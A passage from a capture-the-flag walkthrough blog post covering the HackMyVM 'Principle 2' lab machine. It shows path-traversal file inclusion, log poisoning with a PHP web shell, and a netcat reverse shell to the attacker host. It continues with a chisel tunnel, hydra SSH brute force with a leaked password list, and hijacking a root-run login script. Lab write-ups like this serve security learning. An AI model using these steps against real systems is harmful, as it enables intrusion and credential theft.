+</pre></table></code></div></div><p><a href="/assets/img/posts/hmv-principle2-etc-passwd.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle2-etc-passwd.png" alt="/etc/passwd" class="lazyload" data-proofer-ignore></a> <em>/etc/passwd</em></p><p>We can see the system users in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p><p>As is a <code class="language-plaintext highlighter-rouge">nginx</code> server, we will try to find the <code class="language-plaintext highlighter-rouge">access.log</code> and <code class="language-plaintext highlighter-rouge">error.log</code> files:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log
+http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/error.log
+</pre></table></code></div></div><p>As the <code class="language-plaintext highlighter-rouge">access.log</code> and <code class="language-plaintext highlighter-rouge">error.log</code> files are publicly accessible, we will try a log poisoning:</p><h3 id="log-poisoning"><span class="mr-2">Log poisoning</span><a href="#log-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote class="prompt-info"><p>This is the most tricky point. If you do not get the log poisoning on the first attempt because it’s sent or write in a wrong format, php will be interpreted loading the logs, but will throw errors, so the poisoning (and future poisonings) won’t work. At this point, if you fail poisoning the log, and, if you took a snapshot of the fresh install, you can restore the Virtual Machine to its original state very fast. If you didn’t take the snapshot, you will have to reinstall the Virtual Machine, and takes more time.</p></blockquote><p>We start a listener on our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ nc -lvnp 12345
+</pre></table></code></div></div><p>Now, we poison the log and we try to get a reverse shell:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ curl -i -v http://thetruthoftalos.hmv/index.php -A "&lt;?php system(\$_REQUEST['cmd']);?&gt;"
+$ curl -i -v "http://thetruthoftalos.hmv/index.php?filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F%2Fvar%2Flog%2Fnginx%2Faccess.log&amp;cmd=nc%20-e%20/bin/sh%2010.0.1%2012345"
+</pre></table></code></div></div><blockquote class="prompt-warning"><p>I did my php payload from zsh, so I had to escape the “$”:</p></blockquote><p>If the log poisoning worked, we will have shell as <code class="language-plaintext highlighter-rouge">www-data</code>, and we will have to treat our tty to be able to work comfortably:</p><p>First, we get our terminal size, in the host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ stty size
+56 256
+</pre></table></code></div></div><p>Now, we treat our new tty in <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>$ script /dev/null -c bash
+CTRL+Z
+$ stty raw -echo; fg
+$ reset xterm
+$ export TERM=xterm
+$ export SHELL=bash
+$ stty rows 56 columns 256
+</pre></table></code></div></div><h3 id="user-flag"><span class="mr-2">User flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We have Hermanubis’ password for SMB, so let’s see if he has the same password for his user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ su hermanubis
+Password: ByronIsAsshole
+</pre></table></code></div></div><p>Ok, it worked:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>$ id
+uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis
+
+$ ls -la /home/hermanubis
+...
+lrwxrwxrwx 1 root       root          9 Nov 25 17:34 .bash_history -&gt; /dev/null
+-rwx------ 1 hermanubis hermanubis  220 Apr 23  2023 .bash_logout
+-rwx------ 1 hermanubis hermanubis 3526 Apr 23  2023 .bashrc
+-rwx------ 1 hermanubis hermanubis  264 Nov 23 21:18 investigation.txt
+-rwx------ 1 hermanubis hermanubis  807 Apr 23  2023 .profile
+drwxr-x--- 2 hermanubis hermanubis 4096 Nov 28 14:44 share
+-rwx------ 1 hermanubis hermanubis 1080 Nov 25 17:29 user.txt
+</pre></table></code></div></div><p>Now, we can get our first flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ cat /home/hermanubis/user.txt
+</pre></table></code></div></div><p>What was Hermanubis investigating?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ cat /home/hermanubis/investigation.txt
+I am aware that Byron hates me... especially since I lost my password.
+My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
+What he doesn't know is that it is in the Byron database...
+</pre></table></code></div></div><p>Ok, so we know that Melville has a 32 character password. All txt files in <code class="language-plaintext highlighter-rouge">/var/backup</code> have 32 characters, so let’s assume that Melville is using an hexadecimal password that is stored in Byron’s backup. And we need a way to exploit this.</p><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we chek the running services, we will find a running ssh service on port 345:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ systemctl status ssh.service
+● ssh.service - OpenBSD Secure Shell server
+ ...
+     Active: active (running) since ...
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ ss -tunel
+Netid        State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port        Process
+...
+tcp          LISTEN        0             128                           [::]:345                         [::]:*            ino:16724 sk:29 cgroup:/system.slice/ssh.service v6only:1 &lt;-&gt;
+...
+</pre></table></code></div></div><p>We can stablish a reverse proxy using chisel and try to brute force the ssh authentication with hydra.</p><h4 id="the-dictionary"><span class="mr-2">The dictionary</span><a href="#the-dictionary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The first thing we are going to need to perform this attack it’s to create a dictionary with all the neighbors passwords:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>$ sudo su principle2
+$ cat /tmp/backups/*.txt &gt; /tmp/neighbors_passwords.txt
+$ exit
+</pre></table></code></div></div><h4 id="chisel"><span class="mr-2">Chisel</span><a href="#chisel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We check which version of chisel we need:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ uname -a
+Linux principle2 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/Linux
+</pre></table></code></div></div><p>We need the amd64 version of chisel, and copy the binary from our host to <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a>. To do this, we will mount an http server in our host, in the directory where we have the chisel binaries, with python:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ python -m http.server 443
+</pre></table></code></div></div><p>And, in <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a>, we download the chisel bynary from our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>$ wget http://10.0.0.1:443/chisel_1.9.1_linux_amd64
+$ mv chisel_1.9.1_linux_amd64 chisel
+$ chmod 700 chisel
+</pre></table></code></div></div><p>Once copied, we will start the chisel server on our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ ./chisel_1.9.1_linux_amd64 server --reverse 8080
+</pre></table></code></div></div><p>And now, we will start the chisel client on <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:345
+</pre></table></code></div></div><h4 id="hydra"><span class="mr-2">Hydra</span><a href="#hydra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Once stablished the reverse proxy we will bruteforce the password from our host using hydra:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ hydra -l melville -P /tmp/neighbors_password.txt -s 22222 127.0.0.1 ssh -f -o /tmp/melvile_pasword.txt
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat /tmp/melville_password.txt
+... password: 1bd5528b6def9812acba8eb21562c3ec
+</pre></table></code></div></div><h2 id="melville"><span class="mr-2">Melville</span><a href="#melville" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect as Melville using ssh:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>$ ssh -p 22222 melville@localhost
+
+root is watching you, it has a record of all your steps:
+</pre></table></code></div></div><p>Let’s see what we can do:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ id
+uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)
+</pre></table></code></div></div><p>Melville is part of the <code class="language-plaintext highlighter-rouge">talos</code> group, interesting.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat note.txt
+Don't touch SUID, it is very DANGEROUS
+</pre></table></code></div></div><p>We heed the warning, and, examining the files, we find the login warning message:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat .bashrc | more
+echo -e "root is watching you, it has a record of all your steps:\n`cat /opt/users.txt`"
+</pre></table></code></div></div><p>We search interesting files that belongs to our user or groups:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ find / -user melville -o -group melville -o -group talos 2&gt;/dev/null | grep -vE '/run/user|/proc|/sys/fs|/dev|/home'
+/opt/users.txt
+/usr/bin/updater
+/usr/local/share/report
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>$ ls -la /opt/users.txt
+-rw-r----- 1 root talos 95 Dec 11 20:47 /opt/users.txt
+
+$ ls -la /usr/bin/updater
+-rwsr-x--- 1 root melville 16232 Nov 26 11:38 /usr/bin/updater
+
+$ ls -la /usr/local/share/report
+-rwxrwx--- 1 root talos 59 Dec  8 21:07 /usr/local/share/report
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">/opt/users.txt</code> contains a list of the active users and the login time:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat /opt/users.txt
+melville pts/0        2023-12-18 00:00 (10.0.0.1)
+</pre></table></code></div></div><p>And, after investigating the other binaries, we find that <code class="language-plaintext highlighter-rouge">/usr/bin/updater</code> it’s only a script which upgrades the system, while <code class="language-plaintext highlighter-rouge">/usr/local/share/report</code> is the script used to write the logins (the output of the <code class="language-plaintext highlighter-rouge">who</code> command) in <code class="language-plaintext highlighter-rouge">/opt/users.txt</code>. As the time stored in <code class="language-plaintext highlighter-rouge">/opt/users.txt</code> it’s our login time, we an assume that <code class="language-plaintext highlighter-rouge">/usr/local/share/report</code> it’s executed on login. And, if we look closely, we can see that we have write permissions because we are in the <code class="language-plaintext highlighter-rouge">talos</code> group. So we can try to hijack this file in order to get the root flag.</p><h3 id="hijacking"><span class="mr-2">Hijacking</span><a href="#hijacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will override the <code class="language-plaintext highlighter-rouge">/usr/local/share/report</code> content with a simple bash script that retrieves the root flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>#!/usr/bin/env bash
+
+cat /root/root.txt &gt; /home/melville/root_flag.txt
+</pre></table></code></div></div><p>Now, we logout, we login again as <code class="language-plaintext highlighter-rouge">melville</code> and we will get the root flag waiting for us in our <code class="language-plaintext highlighter-rouge">home</code>!</p><p><em>Enjoy! ;)</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackmyvm/'>hackmyvm</a>, <a href='/categories/vm/'>vm</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackmyvm/" class="post-tag no-text-decoration" >hackmyvm</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/hmv/" class="post-tag no-text-decoration" >hmv</a> <a href="/tags/principle/" class="post-tag no-text-decoration" >principle</a> <a href="/tags/rpc/" class="post-tag no-text-decoration" >rpc</a> <a href="/tags/nfs/" class="post-tag no-text-decoration" >nfs</a> <a href="/tags/user-impersonation/" class="post-tag no-text-decoration" >user impersonation</a> <a href="/tags/steganography/" class="post-tag no-text-decoration" >steganography</a> <a href="/tags/path-traversal/" class="post-tag no-text-decoration" >path traversal</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/log-poisoning/" class="post-tag no-text-decoration" >log poisoning</a> <a href="/tags/reverse-proxy/" class="post-tag no-text-decoration" >reverse proxy</a> <a href="/tags/chisel/" class="post-tag no-text-decoration" >chisel</a> <a href="/tags/hydra/" class="post-tag no-text-decoration" >hydra</a> <a href="/tags/binary-hijack/" class="post-tag no-text-decoration" >binary hijack</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20My%20VM%20-%20Principle%202%20-%20rubenhortas@blog&url=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhmv-principle2%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20My%20VM%20-%20Principle%202%20-%20rubenhortas@blog&u=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhmv-principle2%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhmv-principle2%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/neovim-python-ide/">Configuring Neovim as Python IDE</a><li><a href="/posts/neovim-rust-ide/">Configuring Neovim as Rust IDE</a><li><a href="/posts/neovim-c-standard-ide/">Configuring Neovim as Standard C IDE</a><li><a href="/posts/pycharm-neovim-ruff-consistency/">Unify Python Linting. Syncing Ruff between PyCharm and Neovim</a><li><a href="/posts/check-ntp-servers-windows/">How to check NTP servers from Windows</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/gnu-linux/">gnu/linux</a> <a class="post-tag" href="/tags/administration/">administration</a> <a class="post-tag" href="/tags/personal/">personal</a> <a class="post-tag" href="/tags/hardening/">hardening</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/ssh/">ssh</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/hmv-principle/"><div class="card-body"> <em class="small" data-ts="1690502401" data-df="ll" > Jul 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack My VM - Principle</h3><div class="text-muted small"><p> HMV Principle Lastly I’ve been acting (gladly) as beta tester for my friend Kaian. Kaian did the Principle box for HackMyVm and I was one of the chosen to test it. It was a very fun machine and i...</p></div></div></a></div><div class="card"> <a href="/posts/htb-nibbles/"><div class="card-body"> <em class="small" data-ts="1688342401" data-df="ll" > Jul 3, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - Nibbles</h3><div class="text-muted small"><p> Nibbles In this article we are going to assume the following IP addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Nibbles box): 10.0.0.2 As this is a ret...</p></div></div></a></div><div class="card"> <a href="/posts/htb-getting-started/"><div class="card-body"> <em class="small" data-ts="1688515201" data-df="ll" > Jul 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - Getting started</h3><div class="text-muted small"><p> Getting started In this article we are going to assume the folling ip addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Getting started box): 10.0.0.2 Th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-secretrezipe/" class="btn btn-outline-primary" prompt="Older"><p>Hack the box SecretRezipe</p></a> <a href="/posts/htb-quickr/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - QuickR pwned!</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/gnu-linux/">gnu/linux</a> <a class="post-tag" href="/tags/administration/">administration</a> <a class="post-tag" href="/tags/personal/">personal</a> <a class="post-tag" href="/tags/hardening/">hardening</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/ssh/">ssh</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://github.com/rubenhortas">Rubén Hortas</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-NJBDP43045"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-NJBDP43045'); }); </script>
